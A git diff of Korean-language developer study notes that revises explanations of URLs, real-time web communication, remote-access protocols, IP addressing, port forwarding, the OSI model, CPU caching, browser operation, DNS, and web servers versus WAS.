-### # **URI와 URL,URN**
+  4. 지역별 차단 우회 : IP를 사용한 지역별 차단을 우회하여 거주자 전용 컨텐츠 등을 확인할 수 있다.
 
 <br>
+
+### # URI, URL, URN
 
 - URI
 
-  URI 통합 자원 식별자로 URL과 URN을 포함하는 개념이다. 가장 흔한 URI는 URL이다.
-
-<br>
+  리소스(자원)를 식별하기 위한 통합 개념, URL과 URN을 포함하는 개념이다.
 
 - URL
 
-  우리가 아는 일반적인 웹 주소 형식이다, 리소스의 location을 가리키는데 사용된다.
-
-<br>
+  URI의 하위 개념으로, 리소스의 위치(Location)를 명시 (예시: https://example.com/path)
 
 - URN
 
-  http와 같은 프로토콜을 제외한다, 리소스의 name을 가리키는데 사용된다.
-
-<br>
+  URI의 하위 개념으로, 리소스의 이름(Name)을 식별하지만, 위치 정보는 없음 (예시: urn:isbn:9783161484100)
 
 - URI, URL 구성
 
-  | 부분                             | 명칭     | 설명                                                                                |
-  | -------------------------------- | -------- | ----------------------------------------------------------------------------------- |
-  | file://, http://, https://       | scheme   | 통신 프로토콜                                                                       |
-  | 127.0.0.1, www.google.com        | hosts    | 웹 페이지, 이미지, 동영상 등의 파일이 위치한 웹 서버, 도메인 또는 IP                |
-  | :80, :443, :3000                 | port     | 웹 서버에 접속하기 위한 통로                                                        |
-  | /search, /Users/username/Desktop | url-path | 웹 서버의 루트 디렉토리로부터 웹 페이지, 이미지, 동영상 등의 파일이 위치까지의 경로 |
-  | q=JavaScript                     | query    | 웹 서버에 전달하는 추가 질문                                                        |
+  | 부분                             | 명칭                 | 설명                                                                      |
+  | -------------------------------- | -------------------- | ------------------------------------------------------------------------- |
+  | file://, http://, https://       | scheme(protocol)     | 자원에 접근하는 방법 또는 통신 방식 (http, https, ftp, mailto 등)         |
+  | 127.0.0.1, www.google.com        | hosts                | 리소스를 호스팅하는 서버의 도메인 이름 또는 IP 주소                       |
+  | :80, :443, :3000                 | port                 | (선택 사항) 서버의 특정 서비스로 연결되는 포트 번호. 기본은 80, 443       |
+  | /search, /Users/username/Desktop | path                 | 서버의 특정 자원에 대한 경로. 디렉토리 구조 기반                          |
+  | ?q=JavaScript&page=1             | Query (Query String) | (선택 사항) 서버에 전달할 데이터. key=value 형식, &로 구분                |
+  | #section2                        | Fragment             | (선택 사항) 문서 내 특정 위치(앵커)로 이동할 때 사용 (HTML의 id와 매칭됨) |
 
 <br>
 
-### # **폴링, 롱폴링, 소켓 통신, 웹소켓, Server-Sent Event에 대해 설명해주세요.**
-
-<br>
+### # 폴링, 롱폴링, 소켓 통신, 웹소켓, Server-Sent Event
 
 - 폴링(Polling)
 
-  리얼타입 웹을 위한 기법, 브라우저가 일정한 주기로 HTTP 요청을 보내는 방식이다. 보통 실시간 데이터의 업데이트 주기는 예측하기 어려우므로, 그에 따른 불필요한 서버 및 네트웍 부하가 늘어난다.
-
-<br>
+  리얼타입 웹을 위한 기법, 브라우저가 일정한 주기로 HTTP 요청을 보내는 방식이다. 보통 실시간 데이터의 업데이트 주기는 예측하기 어려우므로 변경 사항이 없어도 계속 요청하므로 불필요한 트래픽과 서버 부하 발생
 
 - 롱폴링(Long-Polling)
 
-  리얼타입 웹을 위한 기법, HTTP 요청 시 서버는 해당 요청을 일정 시간 동안 대기 시킨다. 만약, 대기 시간 안에 데이터가 업데이트되었다면, 그 즉시 클라이언트에게 응답을 보내고 전달받은 데이터를 처리 후 서버로 재요청을 시작한다.
-
-<br>
+  리얼타입 웹을 위한 기법, 클라이언트가 서버에 요청을 보내고 서버는 데이터가 준비될 때까지 대기 후 응답. 응답이 오면 클라이언트는 즉시 새로운 요청을 보내 지속적으로 데이터를 받음. 여전히 요청-응답 반복 구조라 지연/부하 가능성 존재
 
 - 웹소켓
 
-  HTTP 프로토콜은 비연결지향 프로토콜로 요청과 응답이 완료된 후 커넥션 연결을 끊어버리는 특징이 있지만 웹소캣의 경우 커넥션을 유지하여 언제든 양방향 통신이 가능하도록 하는 기술이다. 최초 연결은 HTTP 프로토콜을 통해 이루어지고 이후 웹소캣 연결이 완료되면 독자적인 프로토콜을 사용한다. 실시간 채팅과 같이 리얼타임 같은 기능에 사용된다.
-
-<br>
+  HTTP 프로토콜은 비연결지향 프로토콜로 요청과 응답이 완료된 후 커넥션 연결을 끊어버리는 특징이 있지만 웹소캣의 경우 커넥션을 유지하여 언제든 양방향 통신이 가능하도록 하는 기술이다.
+  최초 연결은 HTTP 프로토콜을 통해 이루어지고 이후 웹소캣 연결이 완료되면 독자적인 프로토콜을 사용한다. 실시간 채팅과 같이 리얼타임 같은 기능에 사용된다.
 
 - SSE(Server-Sent Event)
 
-  웹소켓이 양방향 통신이라면 SSE는 단방향 통신으로 클라이언트가 데이터를 받을 수만 있게 하는 통신 방법이다. 웹소켓과 달리 HTTP프로토콜을 사용하며 알람 같은 기능에 사용된다.
+  웹소켓이 양방향 통신이라면 SSE는 단방향 통신(서버 -> 클라이언트)으로 클라이언트가 데이터를 받을 수만 있게 하는 통신 방법이다. 웹소켓과 달리 HTTP 프로토콜을 사용하며 주로 알림, 모니터링 데이터, 뉴스 피드 등에 적합 (양방향이 필요 없다면 웹소켓보다 효율적)
+
+- 비교 요약
+
+  | 항목           | 폴링        | 롱폴링      | 웹소켓           | SSE                        |
+  | -------------- | ----------- | ----------- | ---------------- | -------------------------- |
+  | 통신 방향      | 단방향      | 단방향      | **양방향**       | 단방향 (서버 → 클라이언트) |
+  | 연결 방식      | 주기적 요청 | 요청 → 대기 | **지속적 연결**  | 지속적 연결                |
+  | 서버 push 가능 | ❌          | ❌          | ✅               | ✅                         |
+  | 기반 프로토콜  | HTTP        | HTTP        | HTTP → WebSocket | HTTP (text/event-stream)   |
+  | 실시간성       | 낮음        | 중간        | **높음**         | 높음                       |
+  | 브라우저 지원  | 전체        | 전체        | 대부분 지원      | 대부분 지원 (IE 미지원)    |
+  | 구현 난이도    | 쉬움        | 중간        | 어려움           | 쉬움                       |
 
 <br>
 
-### # **telnet, SSH, FTP, SFTP**
+### # telnet, SSH, FTP, SFTP
+
+- telnet : 원격 접속
+
+  네트워크를 통해 원격 컴퓨터의 터미널(명령어 인터페이스)에 접속할 수 있는 프로토콜, 평문 (기본 23번 포트)
+
+- SSH(Secure Shell) : 보안 원격 접속
+
+  네트워크 상에서 원격 컴퓨터에 안전하게 접속하고 명령을 실행할 수 있게 해주는 프로토콜 (기본 22번 포트)
+
+- FTP(File Transfer Protocol) : 파일 전송
+
+  클라이언트와 서버 간에 파일을 전송하기 위한 표준 프로토콜, 평문 (제어 연결 기본 21번 포트, 데이터 전송 20번 (액티브 모드에서만 사용))
+
+- SFTP(Secure File transfer protocol) : 보안 파일 전송
+
+  SSH 연결을 기반으로 암호화된 파일 전송을 제공하는 프로토콜 (기본 포트 22번, SSH와 동일)
 
 <br>
 
-- telnet
-
-  인터넷이나 로컬 영역 네트워크 연결에 쓰이는 TCP/IP 기반의 네트워크 프로토콜, 보안 문제 때문에 원격 제어를 위해 SSH(Secure Shell)를 사용하는 것이 좋다. (신호/명령 제어 21번 포트, 데이터 전송 20번 포트)
-
-<br>
-
-- FTP(File Transfer Protocol)
-
-  TCP/IP 프로토콜을 가지고 서버와 클라이언트 사이의 파일 전송을 위한 프로토콜, 보안이 취약하다. (기본 21번 포트)
-
-<br>
-
-- SSH(Secure Shell)
-
-  네트워크를 통한 원격 호스트 연결 과정을 보호하기 위해 설계된 프로토콜로 텔넷의 보안 버전이다. 강력한 인증방법을 제공하거나 보안통신 기능을 제공한다. 또한 암호화 기법을 사용하기 때문에 통신이 노출되어도 암호화된 문자로 보여진다. (기본 22번 포트)
-
-<br>
-
-- SFTP(Secure File transfer protocol)
-
-  SFTP는 SSH방식을 이용하여 안전하게 암호화된 구간에서 FTP 기능을 이용 가능하도록 한 프로토콜 (SSH가 사용하는 포트)
-
-<br>
-
-### # **공인 IP, 사설 IP**
-
-<br>
+### # 공인 IP, 사설 IP
 
 - 공인 IP
 
-  인터넷 사용자의 로컬 네트워크(LAN)를 식별하기 위해 ISP(인터넷 서비스 공급자)가 제공하는 IP 주소이다. 공용 IP 주소라고도 불리며 외부에 공개되어 있는 IP 주소이다.
-
-<br>
+  인터넷 사용자의 로컬 네트워크(LAN)를 식별하기 위해 ISP(인터넷 서비스 공급자)가 제공하는 IP 주소이다. 공용 IP 주소라고도 불리며 외부에 공개되어 있는 IP 주소 (예 웹 서버, DNS 서버, 인터넷 공유기의 WAN 포트 등)
 
 - 사설 IP
 
-  로컬 IP, 가상 IP라고도 불리며, 외부에서 접근할 수 없는 IP를 의미한다. 일반 가정이나 회사 내부에서 사용할 목적으로 할당된 IP 주소이며, 공인 IP가 할당된 라우터나 공유기를 통해 로컬 네트워크에 연결된 기기에 사설 IP가 할당된다.
+  로컬 IP, 가상 IP라고도 불리며 내부 네트워크(로컬망)에서만 사용되며 인터넷 상에서는 유효하지 않은 IP 주소 (예 공유기에 연결된 스마트폰, 컴퓨터, 프린터 등)
 
 <br>
 
-### # **포트 포워딩, 내부포트, 외부포트**
-
-<br>
+### # 포트 포워딩, 내부포트, 외부포트
 
 - 포트(Port)
 
-  프로세스를 식별하기 위해 호스트 내부적으로 프로세스가 할당받는 고유한 값이다. 어떠한 데이터가 송수신을 할 때 데이터링크 계층에서는 호스트(네트워크에 연결된 컴퓨터)의 NIC로 MAC 주소를 판별하고 네트워크 계층에서는 IP 주소로 목적지를 판별한다. 이렇게 MAC 주소와 IP 주소를 통해 목적지 호스트까지 도달한 후에는 어떤 프로세스에서 데이터를 받을 것인지를 알아야 하는데 이 때 쓰이는 것이 포트 번호이다.
-
-<br>
+  포트는 하나의 컴퓨터(호스트) 내에서 실행 중인 애플리케이션(프로세스)을 식별하기 위한 논리적인 숫자이다. IP 주소가 어떤 컴퓨터로 데이터를 보낼지를 나타낸다면, 포트는 그 컴퓨터 안의 어떤 프로그램(서비스)에 보낼지를 결정한다.
 
 - 포트 포워딩(Port-Forwarding)
 
-  포트 포워딩이란 컴퓨터 네트워크에서 패킷이 라우터나 방화벽 같은 네트워크 게이트웨이를 통과하는 동안 네트워크 주소를 변환해주는 것을 의미한다. 사용자가 외부IP를 통해 접속을 요청했을 때 내부IP에 접속할 수 있도록 포트를 연결해주는 것을 말한다.
-
-<br>
+  포트 포워딩은 외부 네트워크에서 들어오는 요청을 내부 네트워크의 특정 장치와 포트로 전달하는 기능이다. 보통 공유기나 라우터에서 설정하며, 외부에서 특정 서비스(예: 웹 서버, 게임 서버 등)에 접근할 수 있도록 할 때 사용된다.
 
 - 내부포트
 
-  내부 포트란 외부에서 8080 포트로 접속한 기기를 내부의 어떤 포트 번호로 연결해 주느냐에 대한 포트 번호이다.
-
-<br>
+  라우터나 공유기가 실제 내부 장치로 전달할 때 사용하는 포트 번호
 
 - 외부포트
 
-  외부 포트란 웹 브라우저에서 공인 IP를 통해 내부 웹서버(컴퓨터)로 접속할 때 공인 IP 뒤의 ":"(콜론) 뒤에 붙는 숫자가 외부 포트 번호이다. 사용자가 외우기 쉬우면서 기존 포트 번호와 겹치지 않는 번호로 설정해야한다.
+  외부에서 접속할 때 사용하는 공인 IP 주소의 포트 번호
 
 <br>
 
-### # **OSI 7계층이란? 각 계층은?** (물데네전세표응)
-
-<br>
+### # OSI 7계층
 
 - OSI(Open Systems Interconnection Reference Model) 7계층
 
-  OSI 7계층은 국제표준화기구(ISO)에서 개발한 모델로, 네트워크에서 통신이 일어나는 과정을 7단계로 나누어 표현한 모델이다. 7계층으로 나눈 이유는 통신의 흐름을 파악하기 쉽게 하고 통신 장애 발생 시 특정 단계에 이슈만 해결하면 되기 때문에 7계층으로 나누게 되었다고 한다.
+  OSI 7계층은 국제표준화기구(ISO)가 정의한 네트워크 통신의 추상화 모델이다. 통신 과정을 7단계로 나눔으로써 문제를 쉽게 구분하고, 역할을 명확히 하며, 프로토콜을 표준화할 수 있게 했다.
+
+- 각 계층 설명 (하위 -> 상위)
+
+  | 계층 번호 | 계층 이름 (한글/영문)            | 주요 기능                                                        | 대표 장비/프로토콜        |
+  | --------- | -------------------------------- | ---------------------------------------------------------------- | ------------------------- |
+  | 1계층     | **물리 계층** (Physical)         | 0과 1의 **비트 단위 데이터**를 물리적으로 전송                   | 케이블, 허브, 리피터      |
+  | 2계층     | **데이터 링크 계층** (Data Link) | 프레임 단위 데이터 전송, **MAC 주소**, 에러 검출                 | 스위치, 브릿지, 이더넷    |
+  | 3계층     | **네트워크 계층** (Network)      | **패킷 전송**, 논리적 주소(IP), 라우팅                           | 라우터, IP, ICMP          |
+  | 4계층     | **전송 계층** (Transport)        | **프로세스 간 통신**, 포트 번호, 신뢰성 (TCP), 속도 (UDP)        | TCP, UDP                  |
+  | 5계층     | **세션 계층** (Session)          | 연결 관리, 세션 생성/유지/종료                                   | API, 소켓, NetBIOS        |
+  | 6계층     | **표현 계층** (Presentation)     | 데이터 형식 변환, 암호화, 압축, 인코딩/디코딩                    | JPEG, MPEG, SSL, ASCII    |
+  | 7계층     | **응용 계층** (Application)      | 사용자와 가장 가까운 계층, 애플리케이션 네트워크 인터페이스 제공 | HTTP, FTP, DNS, SMTP, SSH |
 
 <br>
 
-- 1계층 물리계층(Physical Layer)
-
-  물리적 장치를 통해 데이터 전송한다. (케이블, 리피터, 허브 등)
-
-<br>
-
-- 2계층 데이터 링크계층(DataLink Layer)
-
-  물리계층에서 송수신되는 정보에 대한 에러검출, 재전송, 흐름제어를 하여 정보가 안전하게 전달되도록 도와준다. (브릿지, 스위치 등)
-
-<br>
-
-- 3계층 네트워크 계층(Network Layer)
-
-  라우터를 통해 이동할 경로를 선택하여 IP 주소를 지정하고, 해당 경로에 따라 패킷을 전달해준다. (라우터, IP 등)
-
-<br>
-
-- 4계층 전송 계층(Transport Layer)
-
-  TCP와 UDP 프로토콜을 통해 통신을 활성화한다. 포트를 열어두고, 프로그램들이 전송을 할 수 있게 한다. (TCP, UDP)
-
-<br>
-
-- 5계층 세션 계층(Session Layer)
-
-  데이터가 통신하기 위한 논리적 연결을 담당한다. TCP/IP 세션 생성, 유지, 종료, 복구 등을 수행한다. (API, Socket)
-
-<br>
-
-- 6계층 표현 계층(Presentation Layer)
-
-  코드 변환, 데이터 암호화, 압축, 구문 검색, 정보 형식 변환, 문맥관리 등의 기능을 수행한다. (JPEG, MPEG 등)
-
-<br>
-
-- 7계층 응용 계층(Application Layer)
-
-  네트워크 소프트웨어 UI 부분, 사용자의 입출력(I/O)부분이다. (HTTP, FTP, DNS 등)
-
-<br>
-
-### # **캡슐화와 역캡슐화**
-
-<br>
+### # 캡슐화, 역캡슐화
 
 - 캡슐화와 역캡슐화
 
   컴퓨터의 웹 브라우저에 URL을 입력할 때부터 웹 서버에 데이터가 도착할 때까지 각 과정에서는 캡슐화와 역캡슐화가 이루어진다.
 
-<br>
-
 - 캡슐화
 
-  데이터를 보내는 송신 측에서 데이터를 보낼 때 데이터의 앞부분에 전송 시 필요한 정보가 담긴 헤더를 붙여서 다음 계층으로 보내는데 이 과정을 캡슐화라고 한다. 헤더에는 추가적인 정보 데이터와 데이터를 전달받을 상대방에 대한 정보가 담겨져 있다. 캡슐화가 진행되는 방향은 상위 계층에서 하위 계층이다. (응용 -> 물리)
+  송신 측(데이터를 보내는 쪽)에서 상위 계층의 데이터에 각 계층별 헤더(필요 시 트레일러 포함)를 덧붙여 하위 계층으로 전달하는 과정을 말한다. (상위에서 하위로 진행 응용 계층 -> 물리 계층)
 
-<br>
+  ex) 데이터 → TCP 헤더 추가 → IP 헤더 추가 → 이더넷 헤더 추가 → 전송
 
 - 역캡슐화
 
-  데이터를 받는 수신 측에서 데이터와 추가 된 헤더를 분리하여 헤더를 하나 씩 제거해나가는 과정을 역캡슐화라고 한다. 역캡슐화가 진행되는 방향은 하위 계층에서 상위 계층이다. (물리 -> 응용)
+  수신 측(데이터를 받는 쪽)에서는 수신된 데이터에서 각 계층이 붙인 헤더를 하나씩 제거하면서 원래의 데이터로 복원한다.
+
+  ex) 수신 → 이더넷 헤더 제거 → IP 헤더 제거 → TCP 헤더 제거 → 원본 데이터
 
 <br>
 
-### # 캐시기억장치의 캐시란? (레지스터, 캐시기억장치, 주기억장치, 보조기억 장치 중 캐시기억장치)
-
-<br>
+### # CPU 캐시기억장치의 캐시 (레지스터, 캐시기억장치, 주기억장치, 보조기억 장치 중 캐시기억장치)
 
 - 캐시
 
-  자주 사용하는 데이터나 값을 미리 복사해 놓는 임시 장소를 가리킨다. 저장 공간이 작고 비용이 비싼 대신 빠른 성능을 제공한다. 캐시는 비용이 비싸기 때문에 데이나 값을 선별하여 저장하는데 선별할 때는 지역성이 고려되어야 한다. 쿠키/세션과 같은 경우 정보 저장을 통해 사용자 인증을 도와주는 반면 캐시는 웹 페이지가 빠르고 효율적인 처리를 할 수 있도록 도와준다.
+  - 캐시(Cache)는 CPU와 주기억장치(RAM) 사이에 위치한 고속의 임시 기억장치로, 자주 사용하는 데이터를 미리 저장해 CPU가 빠르게 접근할 수 있도록 돕는다.
+
+  - 레지스터 < 캐시 < 주기억장치(RAM) < 보조기억장치(HDD/SSD), 레지스터를 기준으로 속도는 가장 빠르고 용량은 매우 작고, 가격은 가장 비싸다. 우측으로 갈수록 속도가 느려지고 용량이 커지며 가격이 저렴해진다.
 
 <br>
 
 - 캐시의 지역성
 
-  (1) 시간적 지역성 : 최근 액세스 된 기억 장소가 가까운 미래에 다시 액세스 가능성 높음 (공통 변수)
+  1. 시간적 지역성 : 최근에 접근한 데이터는 가까운 미래에 다시 접근할 가능성이 높다.
 
-  (2) 공간적 지역성 : 액세스된 기억장소와 인접한 기억장소가 액세스될 가능성 높음 (배열)
+  2. 공간적 지역성 : 한 번 접근한 메모리 주소 근처의 주소도 곧 접근할 가능성이 높다.
 
 <br>
 
 - 캐시 동작 방식
 
-  (1) 데이터 요청이 들어오면 캐시 탐색
+  1. CPU가 데이터를 요청하면 우선 캐시에서 검색 (Cache Hit 여부 확인)
 
-  (2) 캐시가 없거나 오래된 경우 원본 데이터가 저장된 곳에서 데이터 조회 후 캐시에 데이터를 복사 및 갱신
+  2. 캐시에 없으면 (Cache Miss) → 주기억장치(RAM)에서 읽고, 캐시에 복사
 
-  (3) 캐시에 데이터가 있으면 캐시의 저장된 데이터를 제공
+  3. 캐시에 데이터가 있으면 바로 반환 → 처리 속도 향상
 
-  (4) 오래된 데이터는 삭제
-
-<br>
-
-- 로컬 캐시 vs 글로벌 캐시
-
-  속도는 로컬 캐시(로컬 서버 메모리, 디스크 등의 장비에 리소스 사용)가 더 빠르고 글로벌 캐시(별도의 캐시 서버에 저장)는 데이터 공유가 쉽다.
+  4. 오래된 데이터는 **교체 알고리즘(LRU 등)**에 따라 제거됨
 
 <br><br><br>
 
@@ -10060,15 +10299,11 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **브라우저 동작 원리**
-
-<br>
+### # 브라우저 동작 원리
 
 - 브라우저란?
 
   브라우저란 웹 페이지, 이미지와 같은 콘텐츠를 수신하고 전송하고 표현하는 소프트웨어다. 대표적인 브라우저로 크롬, 사파리 등이 있다. 브라우저의 주요 기능은 사용자가 선택한 URI 주소의 자원을 서버에 요청하고 브라우저에 표시하는 것이다.
-
-<br>
 
 - 브라우저 기본 구조
 
@@ -10100,97 +10335,70 @@ function GenericReturnFunc<T>(arg: T): T {
 
     Cookie, Local storage등 local에 data를 저장하는 저장소
 
-<br>
-
 - 브라우저의 동작 과정
 
-  (0) 사용자가 브라우저 주소표시줄에 검색하고자 하는 URL을 입력한다.
+  1. 사용자가 브라우저 주소표시줄에 검색하고자 하는 URL을 입력 -> 브라우저가 URL 파싱
 
-  (1) DNS 조회
+  - 프로토콜(http/https), 도메인, 포트 등으로 나눔
 
-  검색 주소의 웹 서버 IP 주소를 찾기 위해 브라우저, OS, 라우트, ISP 캐시에 캐싱 된 DNS 기록을 우선적으로 확인하고 캐싱 된 기록이 없다면 IP 주소를 응답 받을 때 까지 루트, 탑 레벨, 세컨드 레벨, 써드 레벨 네임 서버까지 순차적으로 IP 주소를 요청한다.
+  - 예: https://www.example.com:443 → 프로토콜(https), 도메인(www.example.com), 포트(443)
 
-  (2) TCP/IP 연결
+  2. DNS 서버에 요청하여 해당 URL을 IP 주소로 변환하여 응답
 
-  도메인 주소에 맞는 웹 서버의 IP 주소를 알고난 후에는, 브라우저는 웹 서버와 TCP 3방향 핸드셰이크라는 프로세스를 통해 연결을 설정한다. TCP 3방향 핸드셰이크는 단어 그대로 브라우저와 웹 서버가 SYN과 ACK 메세지들을 가지고 3번의 프로세스를 거친 후에 연결되는 것을 말한다. 이 과정이 완료되면 TCP 연결이 완료된다.
+  - 검색 주소의 웹 서버 IP 주소를 찾기 위해 브라우저, OS, 라우트, ISP 캐시에 캐싱 된 DNS 기록을 우선적으로 확인하고 캐싱 된 기록이 없다면 IP 주소를 응답 받을 때 까지 루트, 탑 레벨, 세컨드 레벨, 써드 레벨 네임 서버까지 순차적으로 IP 주소를 요청한다.
 
-  (3) HTML 파일 요청
+  3. IP 주소를 받은 뒤, 패킷 라우팅
 
-  TCP/IP 연결이 완료되면 브라우저는 HTTP GET 요청을 보내 HTML 파일을 요청한다. 웹 서버가 요청을 받으면, 관련 응답 해더와 함께 HTML의 내용을 응답하게 된다. 그 후 브라우저는 렌더링 과정을 통해 사용자에게 해당 페이지의 결과를 나타내게 된다.
+  - 사용자의 컴퓨터에서 해당 IP가 속한 네트워크로 가기 위한 라우터(게이트웨이)로 패킷 전송
+
+  - 라우터는 최적 경로를 찾아 목적지 서버 네트워크로 패킷 전달
+
+  4. IP 주소 → MAC 주소 변환 (같은 로컬 네트워크 내에서)
+
+  - ARP 프로토콜 사용해 IP 주소에 해당하는 MAC 주소 확인
+
+  - MAC 주소는 물리적 네트워크 인터페이스 고유 주소
+
+  - (중간 라우터 통과 시, 각 네트워크 구간마다 ARP 동작)
+
+  5. TCP 3-way 핸드셰이크를 통해 서버와 TCP 연결 수립
+
+  - 클라이언트와 서버가 SYN, SYN-ACK, ACK 순서로 패킷 주고받으며 연결 확립
+
+  6. TCP 연결 후 HTTP 요청 전송
+
+  - HTTP/HTTPS 프로토콜로 원하는 리소스 요청 (예: HTML 문서)
+
+  - 서버는 요청받은 리소스를 HTTP 응답으로 전송
+
+  7. 브라우저가 받은 응답(HTML, CSS, JS, 이미지 등)을 파싱 및 렌더링
+
+<br>
+
+### # DNS
+
+- DNS란 도메인 네임 시스템으로 도메인을 컴퓨터가 이해할 수 있는 IP 주소로 변환해주는 네임 서버 시스템이다. 사용자가 주소창에 도메인 주소를 입력하면 브라우저는 해당 도메인 주소를 가지고 있는
+  네임 서버에 요청을 보내고 네임 서버는 해당 도메인 주소와 매핑되는 IP 주소를 찾은 후 응답해준다.
 
 <br>
 
-- 브라우저 렌더링 엔진의 동작 과정
-
-  (0) 리소스 요청 및 응답 : 사용자가 웹 페이지 접근 시 해당 페이지에 관한 리소스(HTML, CSS, Javascript, 이미지 파일 등)를 서버에 요청 후 응답 받은 뒤 렌더링 진행
-
-  (1) Parsing : 렌더링 엔진의 HTML 파서가 HTML 파싱하여 DOM(Document Object Model) 트리 생성, CSS 파서가 CSS 파싱하여 CSSOM(Css Object Model) 트리 생성
-
-  (2) Style : 두 트리를 결합하여 렌더 트리 생성
-
-  (3) Layout/Reflow : 렌더 트리에서 각 노드의 위치와 크기를 계산한다.
-
-  (4) Paint/Repaint : 계산된 값을 이용해 각 노드를 화면상의 실제 픽셀로 변환하고, 레이어를 만든다.
-
-  (5) Composite : 레이어를 합성하여 실제 화면에 나타낸다.
-
-  (6) Javascript : 자바스크립트는 렌더링 엔진이 아닌 자바스크립트 엔진이 처리한다. HTML 파서는 script 태그를 만나면 자바스크립트 코드를 실행하기 위해 DOM 생성 프로세스를 중지하고 자바스크립트 엔진으로 제어 권한을 넘긴다. 제어 권한을 넘겨 받은 자바스크립트 엔진은 script 태그 내의 자바스크립트 코드 또는 script 태그의 src 어트리뷰트에 정의된 자바스크립트 파일을 로드하고 파싱하여 실행한다. 자바스크립트의 실행이 완료되면 다시 HTML 파서로 제어 권한을 넘겨서 브라우저가 중지했던 시점부터 DOM 생성을 재개한다.
-
-  (7) Reflow/Repaint : 렌더링 과정을 거친 뒤에 최종적으로 페이지가 그려진다고 해서 렌더링 과정이 다 끝난것이 아니다. 어떠한 액션이나 이벤트에 따라 html 요소의 크기나 위치등 레이아웃 수치를 수정하면 그에 영향을 받는 자식 노드나 부모 노드들을 포함하여 Layout 과정을 다시 수행하게 된다. 이렇게 되면 Render Tree와 각 요소들의 크기와 위치를 다시 계산하게 된다. 이러한 과정을 Reflow라고 한다. Reflow만 수행되면 실제 화면에 반영되지 않는다. Render Tree를 다시 화면에 그려주는 과정이 필요하다. 결국은 Paint 단계가 다시 수행되는 것이며 이를 Repaint 라고 한다.
-
-<br>
-
-### # **Web Server와 WAS**
-
-<br>
+### # Web Server, WAS
 
 - Web Server
 
-  Web Server란 클라이언트(브라우저)로부터 HTTP 요청을 받아 HTML 문서나 각종 리소스를 전달하는 서버이다. 클라이언트의 요청을 기다리고 요청에 대한 데이터를 만들어서 응답한다. 응답하는 데이터는 즉시 응답이 가능한 정적 컨텐츠 (HTML, CSS, 이미지 등)로 한정된다. 이 때 Web Server가 동적 컨텐츠를 요청 받으면 WAS에게 해당 요청을 넘겨주고 WAS에서 처리한 결과물을 클라이언트에게 전달하는 역할도 수행한다. 이러한 웹 서버에는 Apache, NginX 등이 있다.
-
-<br>
-
-- Nginx vs Apache
-
-  Nginx 웹 서버는 Apache 웹 서버의 성능 제한을 해결하기 위해 탄생한 웹 서버, 대용량 트래픽 처리에 적합
-
-<br>
+  클라이언트(브라우저)로부터 HTTP 요청을 받아 정적 컨텐츠(HTML, CSS, 이미지 등)를 전달하는 서버이다. 동적 컨텐츠 요청은 Web Server가 WAS로 넘겨 처리한 후 결과를 다시 클라이언트에게
+  전달한다. 대표적인 웹 서버로는 Apache, Nginx가 있다.
 
 - WAS (Web Application Server)
 
-  WAS란 DB 조회 혹은 다양한 로직 처리를 요구하는 동적 컨텐츠를 제공하기 위해 만들어진 애플리케이션 서버이다. HTTP 프로토콜을 기반으로 사용자 컴퓨터나 장치에 애플리케이션을 수행해주는 미들웨어로서, 주로 데이터베이스 서버와 같이 수행된다. WAS는 JSP, Servlet 구동환경을 제공해주기 때문에 서블릿 컨테이너 혹은 웹 컨테이너로 불린다.
+  동적 컨텐츠 생성을 담당하는 서버로, 데이터베이스 조회, 비즈니스 로직 수행 등을 처리한다. HTTP 요청을 받아 JSP, Servlet 같은 애플리케이션 코드를 실행하고, 데이터베이스와 연동해 결과를 생성한다.
+  흔히 서블릿 컨테이너 또는 웹 컨테이너라고 불린다. 대표적인 예로 Tomcat, JBoss, WebSphere 등이 있다
 
-  이러한 WAS는 웹 서버의 기능들을 구조적으로 분리하여 처리하고자 하는 목적으로 제시되었다. 분산 트랜잭션, 보안, 메시징, 쓰레드 처리 등의 기능을 처리하는 분산 환경에서 사용된다. WAS는 프로그램 실행 환경과 DB 접속 기능을 제공하고 DB와 소통한다. 이 때 사용하는 언어가 SQL이다. 또 여러 개의 트랜잭션을 관리 가능하고 비즈니스 로직을 수행할 수 있다. 즉 WAS 역할은 Web Server + Web Container라고 볼 수 있다.
-
-  이러한 WAS에는 Tomcat, JBoss, WebSphere 등이 있다.
-
-<br>
+  -> 내가 이해한 내용으로는 서버 사이드 렌더링을 수행하는 서버가 될 수도 있고, API 요청을 처리하는 백엔드 서버가 될 수도 있다.
 
 - WAS가 필요한 이유
 
-  웹 페이지는 정적 컨텐츠와 동적 컨텐츠가 모두 존재한다. 이 때 정적 컨텐츠를 제공하는 Web Server만을 사용한다면 사용자가 원하는 요청에 대한 결과 값을 미리 모두 만들어놓은 후 서비스해야 한다. 하지만 이러한 작업을 수행하기에는 자원이 절대적으로 부족하다. 그렇기 때문에 WAS를 통해 요청에 맞는 데이터를 DB에서 가져와 비지니스 로직에 맞게 결과를 만들어 제공함으로써 자원을 효율적으로 사용할 수 있다.
-
-<br>
-
-### # **프론트엔드 서버와 백엔드 서버**
-
-<br>
-
-- 웹 서버
-
-  주소창에 도메인을 검색하면 해당 도메인의 서버(서버는 보통 3가지로 구성된다. 웹 서버, 웹 애플리케이션 서버, 디비 서버)가 해당 요청에 대한 응답을 하는데 이 때 서버는 보통 프론트엔드 서버와 백엔드 서버로 나뉜다.
-
-<br>
-
-- 프론트엔드 서버
-
-  프론트엔드 서버는 클라이언트(브라우저)에서 요청이 왔을 때 번들링하여 미리 준비해둔 HTML, CSS, Javascript 파일들을 제공한다. 예를 들어 react로 개발한 프론트엔드 애플리케이션을 배포할 때 nginx, apache http server와 같은 웹 서버에 react 빌드 파일을 배포한다. 즉 프론트엔드 서버를 웹 서버라고 볼 수 있다.
-
-<br>
-
-- 백엔드 서버
-
-  백엔드 서버는 클라이언트(브라우저) 혹은 프론트엔드 서버에서 필요한 데이터를 전달해준다. 이 때 데이터를 전달해주는 역할만 수행할 뿐 페이지 렌더링에 필요한 정적 리소스를 제공하는 것은 아니기 때문에 API 서버라고도 부른다.
+  정적 컨텐츠만 처리하는 Web Server로는 동적 데이터 생성이 불가능하다. 모든 페이지를 미리 만들어놓는 것은 비효율적이고 자원 낭비이다. WAS는 클라이언트 요청에 따라 실시간으로 데이터베이스와 상호작용해 필요한 결과를 동적으로 생성하여 효율적인 서비스 제공이 가능하다.
 
 <br><br><br>
 
@@ -10198,91 +10406,49 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **자료구조**
-
-<br>
+### # 자료구조
 
 - 자료구조
 
